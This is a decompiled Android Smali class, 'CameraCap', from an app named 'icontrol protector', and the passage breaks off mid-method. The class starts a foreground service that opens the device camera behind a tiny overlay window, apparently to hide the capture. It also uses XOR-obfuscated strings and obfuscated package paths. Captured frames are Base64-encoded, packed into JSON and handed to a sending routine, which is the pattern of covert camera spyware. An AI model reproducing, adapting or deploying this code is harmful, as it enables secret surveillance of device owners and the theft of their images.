.class public Lcom/icontrol/protector/CameraCap;
.super Landroid/app/Service;
.source "SourceFile"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# static fields
.field public static f:Landroid/hardware/Camera;

.field public static g:Landroid/view/SurfaceView;

.field private static h:Ljava/lang/Object;

.field public static i:Ljava/lang/String;

.field public static j:Landroid/view/WindowManager$LayoutParams;

.field public static k:Landroid/view/WindowManager;

.field public static l:Landroid/view/SurfaceView;

.field static m:Lcom/icontrol/protector/CameraCap;

.field private static final n:Ljava/util/concurrent/ExecutorService;


# instance fields
.field public b:Z

.field public c:Z

.field private d:Ljava/util/List;

.field private e:I


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lcom/icontrol/protector/CameraCap;->h:Ljava/lang/Object;

    const/4 v0, 0x6

    invoke-static {v0}, Ljava/util/concurrent/Executors;->newFixedThreadPool(I)Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/CameraCap;->n:Ljava/util/concurrent/ExecutorService;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/icontrol/protector/CameraCap;->b:Z

    iput-boolean v0, p0, Lcom/icontrol/protector/CameraCap;->c:Z

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/icontrol/protector/CameraCap;->d:Ljava/util/List;

    const/16 v0, 0x50

    iput v0, p0, Lcom/icontrol/protector/CameraCap;->e:I

    return-void
.end method

.method static synthetic a()Ljava/lang/Object;
    .locals 1

    .line 1
    sget-object v0, Lcom/icontrol/protector/CameraCap;->h:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic b(Lcom/icontrol/protector/CameraCap;)Ljava/util/List;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/CameraCap;->d:Ljava/util/List;

    return-object p0
.end method

.method static synthetic c(Lcom/icontrol/protector/CameraCap;)I
    .locals 0

    .line 1
    iget p0, p0, Lcom/icontrol/protector/CameraCap;->e:I

    return p0
.end method

.method static synthetic d(Lcom/icontrol/protector/CameraCap;Landroid/content/Context;[B)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/CameraCap;->h(Landroid/content/Context;[B)V

    return-void
.end method

.method private h(Landroid/content/Context;[B)V
    .locals 5

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x0

    :try_start_0
    invoke-static {p2, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p2

    const/4 v0, 0x2

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v2, v1, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_0

    return-void

    :cond_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const/4 v2, 0x3

    new-array v3, v2, [B

    fill-array-data v3, :array_4

    new-array v4, v1, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p1, 0x5

    new-array p1, p1, [B

    fill-array-data p1, :array_6

    new-array v3, v1, [B

    fill-array-data v3, :array_7

    invoke-static {p1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    const/16 v3, 0xa

    new-array v3, v3, [B

    fill-array-data v3, :array_8

    new-array v4, v1, [B

    fill-array-data v4, :array_9

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, p1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 p1, 0x4

    new-array p1, p1, [B

    fill-array-data p1, :array_a

    new-array v3, v1, [B

    fill-array-data v3, :array_b

    invoke-static {p1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    new-array v3, v2, [B

    fill-array-data v3, :array_c

    new-array v4, v1, [B

    fill-array-data v4, :array_d

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, p1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array p1, v2, [B

    fill-array-data p1, :array_e

    new-array v1, v1, [B

    fill-array-data v1, :array_f

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v0, p1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->d(Ljava/lang/String;)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_1
    :goto_0
    return-void

    :array_0
    .array-data 1
        -0x14t
        0x74t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x5bt
        0x30t
        -0x4dt
        -0x1t
        -0x46t
        -0x48t
        0x61t
        -0x7at
    .end array-data

    :array_2
    .array-data 1
        0x69t
        0x5dt
        -0x4at
        0x24t
        0x25t
        0x1bt
        -0x27t
        -0x19t
    .end array-data

    :array_3
    .array-data 1
        0x2dt
        0x38t
        -0x40t
        0x4dt
        0x46t
        0x7et
        -0x50t
        -0x7dt
    .end array-data

    :array_4
    .array-data 1
        0x13t
        0x17t
        -0x2ct
    .end array-data

    :array_5
    .array-data 1
        0x63t
        0x7et
        -0x50t
        0x2at
        0x40t
        0x5ft
        0x45t
        -0x15t
    .end array-data

    :array_6
    .array-data 1
        -0x11t
        -0x11t
        0x46t
        0x36t
        -0x57t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x7at
        -0x65t
        0x3ft
        0x46t
        -0x34t
        -0x69t
        0x1dt
        0x6at
    .end array-data

    :array_8
    .array-data 1
        -0x1t
        0x78t
        0x43t
        0x74t
        -0x41t
        0x56t
        0x79t
        -0x42t
        -0x3et
        0x60t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x54t
        0x14t
        0x31t
        0x2bt
        -0x24t
        0x3at
        0x10t
        -0x25t
    .end array-data

    :array_a
    .array-data 1
        -0x67t
        -0x6ct
        0x3at
        0x45t
    .end array-data

    :array_b
    .array-data 1
        -0x16t
        -0x1ft
        0x58t
        0x26t
        0xbt
        -0x52t
        -0x3bt
        0x69t
    .end array-data

    :array_c
    .array-data 1
        -0x4dt
        -0x46t
        -0x4dt
    .end array-data

    :array_d
    .array-data 1
        -0x30t
        -0x25t
        -0x22t
        -0x43t
        0xct
        0x1ct
        -0x35t
        0x28t
    .end array-data

    :array_e
    .array-data 1
        0x2bt
        0x7bt
        -0x55t
    .end array-data

    :array_f
    .array-data 1
        0x42t
        0x16t
        -0x34t
        0x6dt
        -0x3at
        0x1dt
        0xat
        0x16t
    .end array-data
.end method

.method private i(Landroid/content/Context;)V
    .locals 2

    .line 1
    :try_start_0
    invoke-static {p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;->b(Landroid/content/Context;)Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;

    move-result-object v0

    invoke-virtual {v0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/mv;->a(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p1

    if-nez p1, :cond_0

    new-instance p1, Landroid/app/Notification;

    invoke-direct {p1}, Landroid/app/Notification;-><init>()V

    :cond_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x22

    if-lt v0, v1, :cond_1

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    const/high16 v1, 0x40000000    # 2.0f

    invoke-static {p0, v0, p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c8;->a(Lcom/icontrol/protector/CameraCap;ILandroid/app/Notification;I)V

    goto :goto_0

    :cond_1
    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    invoke-virtual {p0, v0, p1}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tc;->k:I

    new-instance v0, Landroid/app/Notification;

    invoke-direct {v0}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, p1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method


# virtual methods
.method public e()Z
    .locals 1

    .line 1
    :try_start_0
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    :cond_0
    const/4 v0, 0x0

    return v0

    :catchall_0
    move-exception v0

    throw v0

    :catch_0
    const/4 v0, 0x1

    return v0
.end method

.method public f(Landroid/content/Context;)V
    .locals 2

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/CameraCap;->n:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lcom/icontrol/protector/CameraCap$a;

    invoke-direct {v1, p0, p1}, Lcom/icontrol/protector/CameraCap$a;-><init>(Lcom/icontrol/protector/CameraCap;Landroid/content/Context;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    :cond_0
    return-void
.end method

.method public g()V
    .locals 3

    .line 1
    :try_start_0
    sget-object v0, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    if-eqz v0, :cond_0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    sget-object v0, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    sput-object v1, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_2

    :cond_0
    :goto_0
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/icontrol/protector/CameraCap;->c:Z

    iget-boolean v1, p0, Lcom/icontrol/protector/CameraCap;->b:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v1, :cond_1

    :try_start_1
    sget-object v1, Lcom/icontrol/protector/WorkServices;->j:Lcom/icontrol/protector/AccessServices;

    sget-object v1, Lcom/icontrol/protector/AccessServices;->q:Landroid/view/WindowManager;

    sget-object v2, Lcom/icontrol/protector/CameraCap;->g:Landroid/view/SurfaceView;

    invoke-interface {v1, v2}, Landroid/view/ViewManager;->removeView(Landroid/view/View;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v1

    :try_start_2
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_1
    :goto_1
    iput-boolean v0, p0, Lcom/icontrol/protector/CameraCap;->b:Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_3

    :goto_2
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_3
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/icontrol/protector/CameraCap;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    sput-object v0, Lcom/icontrol/protector/CameraCap;->m:Lcom/icontrol/protector/CameraCap;

    invoke-virtual {p0}, Lcom/icontrol/protector/CameraCap;->g()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 10

    const/4 p2, 0x2

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p3

    invoke-direct {p0, p3}, Lcom/icontrol/protector/CameraCap;->i(Landroid/content/Context;)V

    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    if-eqz p1, :cond_4

    invoke-virtual {p1, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_4

    sget-object v2, Lcom/icontrol/protector/WorkServices;->j:Lcom/icontrol/protector/AccessServices;

    sget-object v2, Lcom/icontrol/protector/AccessServices;->q:Landroid/view/WindowManager;

    const/16 v3, 0x33

    if-eqz v2, :cond_1

    sget-object v2, Lcom/icontrol/protector/AccessServices;->r:Landroid/view/WindowManager$LayoutParams;

    if-eqz v2, :cond_1

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/icontrol/protector/CameraCap;->i:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/icontrol/protector/CameraCap;->e()Z

    move-result p1

    iput-boolean p1, p0, Lcom/icontrol/protector/CameraCap;->b:Z

    if-nez p1, :cond_0

    new-instance p1, Landroid/view/SurfaceView;

    invoke-direct {p1, p0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object p1, Lcom/icontrol/protector/CameraCap;->g:Landroid/view/SurfaceView;

    sget-object p1, Lcom/icontrol/protector/AccessServices;->r:Landroid/view/WindowManager$LayoutParams;

    iput v3, p1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sget-object p1, Lcom/icontrol/protector/AccessServices;->q:Landroid/view/WindowManager;

    sget-object v0, Lcom/icontrol/protector/CameraCap;->g:Landroid/view/SurfaceView;

    sget-object v1, Lcom/icontrol/protector/AccessServices;->r:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {p1, v0, v1}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    sget-object p1, Lcom/icontrol/protector/CameraCap;->g:Landroid/view/SurfaceView;

    invoke-virtual {p1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object p1

    invoke-interface {p1, p0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    :goto_0
    invoke-virtual {p0, p3}, Lcom/icontrol/protector/CameraCap;->f(Landroid/content/Context;)V

    goto/16 :goto_3

    :catch_0
    move-exception p1

    goto :goto_4

    :cond_0
    invoke-virtual {p0}, Lcom/icontrol/protector/CameraCap;->g()V

    return p2

    :cond_1
    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lcom/icontrol/protector/CameraCap;->i:Ljava/lang/String;

    invoke-virtual {p0}, Lcom/icontrol/protector/CameraCap;->e()Z

    move-result p1

    iput-boolean p1, p0, Lcom/icontrol/protector/CameraCap;->b:Z

    if-nez p1, :cond_3

    const/4 p1, 0x6

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array v0, v1, [B

    fill-array-data v0, :array_3

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/WindowManager;

    sput-object p1, Lcom/icontrol/protector/CameraCap;->k:Landroid/view/WindowManager;

    new-instance p1, Landroid/view/SurfaceView;

    invoke-direct {p1, p0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object p1, Lcom/icontrol/protector/CameraCap;->l:Landroid/view/SurfaceView;

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x1a

    if-lt p1, v0, :cond_2

    new-instance p1, Landroid/view/WindowManager$LayoutParams;

    const/4 v5, 0x1

    const/4 v6, 0x1

    const/16 v7, 0x7f6

    const/16 v8, 0x38

    const/4 v9, -0x3

    move-object v4, p1

    invoke-direct/range {v4 .. v9}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    :goto_1
    sput-object p1, Lcom/icontrol/protector/CameraCap;->j:Landroid/view/WindowManager$LayoutParams;

    goto :goto_2

    :cond_2
    new-instance p1, Landroid/view/WindowManager$LayoutParams;

    const/4 v5, 0x1

    const/4 v6, 0x1

    const/16 v7, 0x7d6

    const/high16 v8, 0x40000

    const/4 v9, -0x3

    move-object v4, p1

    invoke-direct/range {v4 .. v9}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    goto :goto_1

    :goto_2
    sget-object p1, Lcom/icontrol/protector/CameraCap;->j:Landroid/view/WindowManager$LayoutParams;

    iput v3, p1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sget-object v0, Lcom/icontrol/protector/CameraCap;->k:Landroid/view/WindowManager;

    sget-object v1, Lcom/icontrol/protector/CameraCap;->l:Landroid/view/SurfaceView;

    invoke-interface {v0, v1, p1}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    sget-object p1, Lcom/icontrol/protector/CameraCap;->l:Landroid/view/SurfaceView;

    invoke-virtual {p1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object p1

    invoke-interface {p1, p0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    goto :goto_0

    :cond_3
    invoke-virtual {p0}, Lcom/icontrol/protector/CameraCap;->g()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return p2

    :cond_4
    :goto_3
    const/4 p1, 0x1

    return p1

    :goto_4
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    return p2

    :array_0
    .array-data 1
        0x79t
        0x17t
        0x67t
        -0x5dt
        0x1at
    .end array-data

    nop

    :array_1
    .array-data 1
        0x3at
        0x53t
        0x6t
        -0x29t
        0x7bt
        -0x17t
        -0x3ft
        -0x9t
    .end array-data

    :array_2
    .array-data 1
        -0x71t
        -0x3t
        0x3ct
        -0x4dt
        0x79t
        0x12t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x8t
        -0x6ct
        0x52t
        -0x29t
        0x16t
        0x65t
        -0x62t
        0x27t
    .end array-data
.end method

.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    sget-object p1, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    if-eqz p1, :cond_0

    new-instance p2, Lcom/icontrol/protector/CameraCap$b;

    invoke-direct {p2, p0}, Lcom/icontrol/protector/CameraCap$b;-><init>(Lcom/icontrol/protector/CameraCap;)V

    invoke-virtual {p1, p2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    :cond_0
    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 8

    :try_start_0
    sget-object v0, Lcom/icontrol/protector/CameraCap;->i:Ljava/lang/String;

    const/4 v1, 0x0

    if-eqz v0, :cond_4

    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, -0x79

    aput-byte v4, v3, v1

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_0

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    aget-object v0, v0, v1

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x5

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    new-array v5, v4, [B

    fill-array-data v5, :array_2

    invoke-static {v3, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    move v0, v1

    :goto_0
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v3

    if-ge v0, v3, :cond_4

    new-instance v3, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v3}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    invoke-static {v0, v3}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    iget v3, v3, Landroid/hardware/Camera$CameraInfo;->facing:I

    if-ne v3, v2, :cond_0

    :goto_1
    move v1, v0

    goto :goto_3

    :cond_0
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    move-exception p1

    goto/16 :goto_4

    :cond_1
    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    new-array v3, v4, [B

    fill-array-data v3, :array_4

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_3

    move v0, v1

    :goto_2
    invoke-static {}, Landroid/hardware/Camera;->getNumberOfCameras()I

    move-result v2

    if-ge v0, v2, :cond_4

    new-instance v2, Landroid/hardware/Camera$CameraInfo;

    invoke-direct {v2}, Landroid/hardware/Camera$CameraInfo;-><init>()V

    invoke-static {v0, v2}, Landroid/hardware/Camera;->getCameraInfo(ILandroid/hardware/Camera$CameraInfo;)V

    iget v2, v2, Landroid/hardware/Camera$CameraInfo;->facing:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v2, :cond_2

    goto :goto_1

    :cond_2
    add-int/lit8 v0, v0, 0x1

    goto :goto_2

    :cond_3
    :try_start_1
    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_4
    :goto_3
    :try_start_2
    invoke-static {v1}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v1

    const/4 v2, 0x0

    if-eqz v1, :cond_8

    invoke-virtual {v0}, Landroid/hardware/Camera$Parameters;->getSupportedPreviewSizes()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_5
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    const/16 v5, 0x1e0

    const/16 v6, 0x280

    if-eqz v4, :cond_6

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/hardware/Camera$Size;

    iget v7, v4, Landroid/hardware/Camera$Size;->width:I

    if-ne v7, v6, :cond_5

    iget v7, v4, Landroid/hardware/Camera$Size;->height:I

    if-ne v7, v5, :cond_5

    move-object v2, v4

    :cond_6
    if-nez v2, :cond_8

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_7
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_8

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/hardware/Camera$Size;

    iget v4, v3, Landroid/hardware/Camera$Size;->width:I

    if-gt v4, v6, :cond_7

    iget v4, v3, Landroid/hardware/Camera$Size;->height:I

    if-gt v4, v5, :cond_7

    move-object v2, v3

    :cond_8
    iget v1, v2, Landroid/hardware/Camera$Size;->width:I

    iget v2, v2, Landroid/hardware/Camera$Size;->height:I

